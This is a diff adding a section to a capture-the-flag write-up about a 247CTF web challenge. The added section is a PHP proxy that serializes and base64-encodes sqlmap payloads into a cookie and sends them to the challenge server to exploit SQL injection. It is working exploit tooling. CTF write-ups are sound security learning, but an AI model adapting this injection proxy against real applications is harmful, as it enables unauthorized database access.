@@ -77,3 +77,49 @@ We can exploit this bug with sqlmap but we have a some problems here, the first 
 we can create a simple local web application act as `proxy server` that manage sqlmap requests and edit on any payload to serialize it and then encode it and send the data to the challange server or instance.
 
 ![IMG8](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/e755af36-3dac-45ca-975d-3d84a5f8cd2e)
+
+
+Here is a simple web application using PHP!
+
+```
+<?php
+
+$payload = $_GET['payload'];
+
+class insert_log
+{
+    public $new_data;
+    public function __construct($payload) {
+        $this->new_data = $payload;
+    }
+}
+
+$object = new insert_log($payload);
+// serialize object and encode it.
+$final_data = base64_encode(serialize($object));
+
+$data = "$final_data" . ".0e";
+
+$targetUrl = "https://a0351f3d2e04038e.247ctf.com/";
+
+// Initialize cURL session
+$ch = curl_init($targetUrl);
+
+// Set cURL options
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+// Set the custom cookie
+curl_setopt($ch, CURLOPT_COOKIE, "247=$data");
+
+// Execute the cURL session and get the response
+$response = curl_exec($ch);
+
+// Close the cURL session
+curl_close($ch);
+
+// Output the response
+echo $response;
+
+```
+
+
